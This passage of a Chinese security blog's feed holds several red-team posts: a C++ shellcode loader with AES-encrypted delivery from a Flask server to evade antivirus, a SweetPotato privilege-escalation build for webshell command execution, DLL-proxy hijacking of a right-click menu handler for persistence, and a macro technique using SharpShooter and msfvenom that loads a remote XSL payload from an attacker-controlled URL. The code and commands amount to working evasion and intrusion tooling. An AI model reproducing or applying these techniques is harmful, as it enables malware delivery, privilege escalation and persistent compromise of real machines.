class="line">        &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// Keep checking for data until there is nothing left.</span></span><br><span class="line">       <span class="comment">// Report any errors.</span></span><br><span class="line">        <span class="keyword">if</span> (!bResults)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Error %d has occurred.\n"</span>, GetLastError());</span><br><span class="line">        <span class="comment">// Close any open handles.</span></span><br><span class="line">        <span class="keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">        <span class="keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">        <span class="keyword">if</span> (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)vFileContent.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            str = vFileContent[i];</span><br><span class="line">            strHtml += vFileContent[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> strHtml;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="aes加密">AES加密</span></h3><p>用如上的域前置方法可以有效的隐藏我们的文件服务器，但是在通信过程中，我们shellcode还是会暴露。所以参照冰蝎的原理，我们可以实现一个对shellcode进行一个AES动态加密的过程。</p><h4><span id="客户端c-加载器">客户端（C++ 加载器）</span></h4><p>C++加载器随机生成一个key值，通过HTTP请求，将key发给文件服务器。</p><p>文件服务器收到请求用key值来加密已有的shellcode，回显给客户端。</p><p>C++加载器用cryptopp库，写一个AES解密函数来解密发过来的shellcode。</p><p>如下是AES解密函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> cryptopp::decrypt(<span class="keyword">const</span> <span class="built_in">string</span>&amp; cipherTextHex)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> cipherText;</span><br><span class="line">    <span class="built_in">string</span> decryptedText;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">stringstream</span> ss;</span><br><span class="line">        ss &lt;&lt; hex &lt;&lt; cipherTextHex.substr(i, <span class="number">2</span>).c_str();</span><br><span class="line">        ss &gt;&gt; x;</span><br><span class="line">        c = (<span class="keyword">char</span>)x;</span><br><span class="line">        cipherText += c;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= cipherTextHex.length() - <span class="number">2</span>)<span class="keyword">break</span>;</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        CryptoPP::AES::<span class="function">Decryption <span class="title">aesDecryption</span><span class="params">(s_key, CryptoPP::AES::DEFAULT_KEYLENGTH)</span></span>;</span><br><span class="line">        CryptoPP::CBC_Mode_ExternalCipher::<span class="function">Decryption <span class="title">cbcDecryption</span><span class="params">(aesDecryption, s_iv)</span></span>;</span><br><span class="line">        <span class="comment">//CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink( decryptedText ),CryptoPP::StreamTransformationFilter::NO_PADDING);</span></span><br><span class="line">        CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink(decryptedText));</span><br><span class="line">        stfDecryptor.Put(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>*&gt;(cipherText.c_str()), cipherText.size());</span><br><span class="line"></span><br><span class="line">        stfDecryptor.MessageEnd();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::exception&amp; e) &#123;</span><br><span class="line">        decryptedText = <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decryptedText;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="服务端python-flask">服务端（Python Flask）</span></h4><p>服务端用Flask写一个web服务，获取请求发送过来的key，用这个key对shellcode进行解密，然后回显给客户端。</p><p>AES加密实现方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AES_Encrypt</span><span class="params">(key)</span>:</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line"></span><br><span class="line">    key = key <span class="comment"># the length can be (16, 24, 32)</span></span><br><span class="line">    vi = <span class="string">'0000000000000000'</span></span><br><span class="line">    shellcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key.encode(<span class="string">'utf8'</span>), AES.MODE_CBC, vi.encode(<span class="string">'utf8'</span>))</span><br><span class="line"></span><br><span class="line">    encrypted = cipher.encrypt(pad(shellcode)).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> str(encrypted)</span><br></pre></td></tr></table></figure><p>key随机生成，至此就可以实现一个简单AES动态流量加密的过程了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;shellcode加载器加载shellcode实现免杀上线，目前可能是使用最多的方法了。&lt;/p&gt;
&lt;p&gt;现有的加载器也特别多，但是改造轮子的心总是在骚动，所以就开始了Shellcode远程加载器改造计划。&lt;/p
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>SweetPotato webshell下执行命令版</title>
    <link href="https://uknowsec.cn/posts/notes/SweetPotato%20Webshell%E4%B8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%89%88.html"/>
    <id>https://uknowsec.cn/posts/notes/SweetPotato Webshell下执行命令版.html</id>
    <published>2020-04-17T10:09:17.000Z</published>
    <updated>2020-04-17T13:29:50.647Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="sweetpotato-webshell下执行命令版">SweetPotato webshell下执行命令版</span></h2><h3><span id="前言">前言</span></h3><p>前两天看到了github上有老外发了一个C#版的烂土豆，所以就想改一个能在webshell下执行命令的版本。</p><p>请教了@zcgonvh和@RcoIl两位师傅，学习了用管道对进程于进程之间进行通信。感谢两位师傅的耐心指导~</p><h3><span id="管道">管道</span></h3><h4><span id="引用申明">引用申明</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public struct SECURITY_ATTRIBUTES</span><br><span class="line">&#123;</span><br><span class="line">     public Int32 nLength;</span><br><span class="line">     public IntPtr lpSecurityDescriptor;</span><br><span class="line">     public int bInheritHandle;</span><br><span class="line">&#125;</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">        public static extern bool CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, Int32 nSize);</span><br><span class="line"></span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped/*IntPtr.Zero*/);</span><br><span class="line">        </span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)]</span><br><span class="line">[return: MarshalAs(UnmanagedType.Bool)]</span><br><span class="line">internal static extern Boolean CloseHandle(IntPtr hObject);</span><br></pre></td></tr></table></figure><h4><span id="创建管道">创建管道</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();</span><br><span class="line">saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));</span><br><span class="line">saAttr.bInheritHandle = 0x1;</span><br><span class="line">saAttr.lpSecurityDescriptor = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">if(CreatePipe(ref out_read, ref out_write, ref saAttr, 0))</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(&quot;[+] CreatePipe success&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="新创建进程的标准输出连在写管道一端">新创建进程的标准输出连在写管道一端</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si = new STARTUPINFO();</span><br><span class="line">PROCESS_INFORMATION pi = new PROCESS_INFORMATION();</span><br><span class="line">si.cb = Marshal.SizeOf(si);</span><br><span class="line">si.lpDesktop = @&quot;WinSta0\Default&quot;;</span><br><span class="line">si.hStdOutput = out_write;</span><br><span class="line">si.hStdError = err_write;</span><br><span class="line">si.dwFlags |= STARTF_USESTDHANDLES;</span><br><span class="line">CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);</span><br></pre></td></tr></table></figure><h4><span id="读取管道">读取管道</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CloseHandle(out_write);</span><br><span class="line">byte[] buf = new byte[BUFSIZE];</span><br><span class="line">int dwRead = 0;</span><br><span class="line">while (ReadFile(out_read, buf, BUFSIZE, ref dwRead, IntPtr.Zero))</span><br><span class="line">     &#123;</span><br><span class="line">          byte[] outBytes = new byte[dwRead];</span><br><span class="line">          Array.Copy(buf, outBytes, dwRead);                    </span><br><span class="line">  Console.WriteLine(System.Text.Encoding.Default.GetString(outBytes));</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(out_read);</span><br></pre></td></tr></table></figure><h3><span id="截图">截图</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\ltd.png" alt=""></p><h3><span id="github">github</span></h3><p><a href="https://github.com/uknowsec/SweetPotato" target="_blank" rel="noopener">https://github.com/uknowsec/SweetPotato</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;sweetpotato-webshell下执行命令版&quot;&gt;SweetPotato webshell下执行命令版&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;前两天看到了github上有老外发了一个C#版的烂
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>DLL劫持右键菜单实现持久化</title>
    <link href="https://uknowsec.cn/posts/notes/DLL%E5%8A%AB%E6%8C%81%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96.html"/>
    <id>https://uknowsec.cn/posts/notes/DLL劫持右键菜单实现持久化.html</id>
    <published>2020-04-13T10:09:17.000Z</published>
    <updated>2020-04-13T12:36:00.600Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="dll代理">DLL代理</span></h3><p>如下图，DLL代理是通过创建一个恶意的DLL来替换原有程序的DLL，同时不删除原有程序的DLL，将其重命名。恶意的DLL在被调用的时候会运行恶意的代码功能，并把原有的DLL功能部分转发给原始DLL，这样更好的确保原有程序的功能正常运行且不被迫坏。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780770334.png" alt="1586780770334"></p><h3><span id="右键菜单注册表">右键菜单注册表</span></h3><p>注册表路径：HKLM\Software\Classes*\ShellEx\ContextMenuHandlers</p><p>利用<code>autoruns</code>可以查看此注册表路径中加载的DLL文件。</p><p>同样也可以对其他自启动注册表里的dll文件进行劫持。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586762524303.png" alt=""></p><p>我们可以用<code>C#</code>实现一个小程序来读取可劫持的DLL。代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">using Microsoft.Win32;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace dll</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            GetKey(@&quot;Software\Classes\*\ShellEx\ContextMenuHandlers\&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static void GetKey(string path)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))</span><br><span class="line">            &#123;</span><br><span class="line">                if (key != null)</span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    string[] rk = key.GetSubKeyNames();</span><br><span class="line">                    foreach (var item in rk)</span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        string value = GetRegistryValue(path + item);</span><br><span class="line">                        string imgpath = GetrootValue(@&quot;CLSID\&quot; + value + @&quot;\InprocServer32\&quot;);</span><br><span class="line">                        if (imgpath != null &amp;&amp; imgpath != &quot;&quot;)</span><br><span class="line">                        &#123;</span><br><span class="line">                            Console.WriteLine(imgpath);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        protected static string GetRegistryValue(string path)</span><br><span class="line">        &#123;</span><br><span class="line">            string value = string.Empty;</span><br><span class="line">            RegistryKey root = Registry.LocalMachine;</span><br><span class="line">            RegistryKey rk = root.OpenSubKey(path);</span><br><span class="line">            if (rk != null)</span><br><span class="line">            &#123;</span><br><span class="line">                value = (string)rk.GetValue(&quot;&quot;, null);</span><br><span class="line">            &#125;</span><br><span class="line">            return value;</span><br><span class="line">        &#125;</span><br><span class="line">        protected static string GetrootValue(string path)</span><br><span class="line">        &#123;</span><br><span class="line">            string value = string.Empty;</span><br><span class="line">            RegistryKey root = Registry.ClassesRoot;</span><br><span class="line">            RegistryKey rk = root.OpenSubKey(path);</span><br><span class="line">            if (rk != null)</span><br><span class="line">            &#123;</span><br><span class="line">                value = (string)rk.GetValue(&quot;&quot;, null);</span><br><span class="line">            &#125;</span><br><span class="line">            return value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780654385.png" alt="1586780654385"></p><h3><span id="创建一个代理的dll">创建一个代理的DLL</span></h3><p>这里用到一个开源的项目。</p><p><a href="https://github.com/rek7/dll-hijacking" target="_blank" rel="noopener">https://github.com/rek7/dll-hijacking</a></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780811272.png" alt="1586780811272"></p><p>生成的<code>definitions.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#pragma once</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">7-zip.dll - 8664 machine (x64)</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/export:DllCanUnloadNow=7-zip_.DllCanUnloadNow,@1&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/export:DllGetClassObject=7-zip_.DllGetClassObject,@2&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/export:DllRegisterServer=7-zip_.DllRegisterServer,@3&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/export:DllUnregisterServer=7-zip_.DllUnregisterServer,@4&quot;)</span><br></pre></td></tr></table></figure><p>替换<code>definitions.h</code>头文件，作者项目的代码里是用的<code>powershell</code>来反弹shell。代码好像有点问题，我这里修改代码进行简单的弹框测试。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://itm4n.github.io/dll-proxying/</span></span><br><span class="line"><span class="comment">https://www.codeproject.com/Articles/17863/Using-Pragmas-to-Create-a-Proxy-DLL</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">to implement: hooking specific functions</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"definitions.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Ws2_32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hinstDLL,  <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD fdwReason,     <span class="comment">// reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved)</span>  <span class="comment">// reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">"Zero Team"</span>, <span class="string">"Zero team"</span>, MB_OK);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// Successful DLL_PROCESS_ATTACH.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="劫持程序右键菜单">劫持程序右键菜单</span></h3><p>编译生成恶意的DLL命名为<code>7-zip.dll</code>，并将原有DLL改名为<code>7-zip_.dll</code>。当我们右键单击程序时，即可运行恶意的DLL。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780745270.png" alt="1586780745270"></p><h3><span id="拓展">拓展</span></h3><p>作者项目里的反弹shell，测试不能成功。我们可以自己用C语言写一个反弹shell的功能，或者加载shellcode。</p><p>如下为在装有卡巴斯基的机器上测试劫持<code>notepad++</code>。成功劫持，并反弹shell，且卡巴斯基未告警。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780727660.png" alt="1586780727660"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780693681.png" alt="1586780693681"></p><p>反弹shell demo流量未加密，最好不要在实战中使用，dll内容可以自己发挥。</p><h3><span id="reference">Reference</span></h3><p><a href="https://b.ou.is/articles/2020-03/context-menu-persistance" target="_blank" rel="noopener">https://b.ou.is/articles/2020-03/context-menu-persistance</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;dll代理&quot;&gt;DLL代理&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;如下图，DLL代理是通过创建一个恶意的DLL来替换原有程序的DLL，同时不删除原有程序的DLL，将其重命名。恶意的DLL在被调用的时候会运行恶意的代码功能，并把原有的DLL功能部分转发给原始DLL，
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>加载远程XSL文件的宏免杀方法</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXSL%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8F%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95.html"/>
    <id>https://uknowsec.cn/posts/notes/加载远程XSL文件的宏免杀方法.html</id>
    <published>2020-03-21T10:09:17.000Z</published>
    <updated>2020-03-22T03:39:28.505Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>​        “打点越来越难了，社工钓鱼会是最常见的攻击手段，0day会是最有效的攻击手段，物理渗透会是危害最大的攻击手段“。</p><p>在钓鱼攻击中木马的形式主要如下：</p><ul><li><p>Office</p></li><li><p>DLL劫持</p></li><li><p>假冒加固工具</p></li><li><p>木马捆绑</p></li></ul><p>通常办公软件Office具有最大的安装量，将文档插入邮件中已经是惯用的工作方式。但是Office常见的攻击方法：</p><ul><li><p>0day</p></li><li><p>已知CVE漏洞</p></li><li><p>DDEAUTO</p></li><li><p>注入执行命令</p></li><li><p>宏</p><p>第一种方法直接跳过，已知的CVE漏洞特征太明显，免杀成本和技术含量太大了。DDEAUTO和注入执行命令直接被杀软限制的很死。最后只能靠宏了，虽然默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知。</p><p>通过收集宏免杀的常用的方法和测试，发现加载远程<code>.xsl</code>文件可以绕过国内常用的杀软360全家桶和火绒成功上线。</p></li></ul><h3><span id="sharpshooter">SharpShooter</span></h3><p>通过收集和测试一些开源的宏免杀的项目，发现了一个很好的项目，国外一个安全团队写的钓鱼框架。其中一个工具就是可以生成一个VBA宏文件，这个宏文件会用XMLDOM去加载远程的<code>.xsl</code>文件。</p><p>具体原理和利用分析见文章：</p><p><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/" target="_blank" rel="noopener">Macros and More with SharpShooter v2.0</a></p><p>更多的框架利用可以看项目介绍：</p><p>项目地址：<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a></p><h3><span id="利用测试">利用测试</span></h3><h4><span id="生成payloadbin">生成payload.bin</span></h4><p>首先我们可以用<code>Cobalt Strike</code>或者<code>Metasploit</code>生成二进制格式的shellcode，即后缀为<code>bin</code>的文件。</p><h4><span id="处理payloadbin">处理payload.bin</span></h4><p>然后利用<code>msfvenom</code>对<code>payload.bin</code>，因为<code>SharpShooter</code>要求shellcode中不能含有空字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure><h3><span id="生成xsl和macro">生成xsl和macro</span></h3><p>如下命令生成<code>.xsl</code>文件和<code>macro</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile shellcode-encoded.bin --com xslremote --awlurl http://192.168.0.104:80/foo.xsl</span><br></pre></td></tr></table></figure><p>简单介绍一下上面的几个参数：</p><ul><li>–dotnetver：为目标的.net版本，可选2或者4</li><li>–awlurl： 为xsl存放地址</li></ul><p><img 